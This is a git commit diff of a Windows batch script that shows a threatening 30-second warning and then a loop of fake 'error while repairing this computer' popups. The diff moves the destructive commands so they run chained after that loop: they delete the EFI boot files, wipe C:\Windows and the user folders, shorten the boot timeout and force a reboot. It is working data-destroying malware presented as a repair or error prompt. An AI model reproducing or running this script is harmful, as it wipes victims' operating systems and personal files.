7e3476335d7dd7187f9118705cbf2888c8322b7b
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 11:50:33 +0530

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -1,13 +1,11 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
-DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.*
-bcdedit /timeout 1
-DEL /F /S /Q /A C:\Windows*.*
-rmdir C:\Users*.* /S /Q
-shutdown -r /o -t 20
 for /L %%i in (1,1,500) do (
-    echo x=msgbox("An error has occurred!", 69, "Error") > "%temp%\errorpopup.vbs"
+    echo x=msgbox("An error has occurred while reapiring this computer!", 69, "Error") > "%temp%\errorpopup.vbs"
     start /wait wscript "%temp%\errorpopup.vbs"
+) & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
+bcdedit /timeout 1
+shutdown -r /o -t 20
 taskkill /im explorer.exe /f
 start explorer.exe
 taskkill /im explorer.exe /f
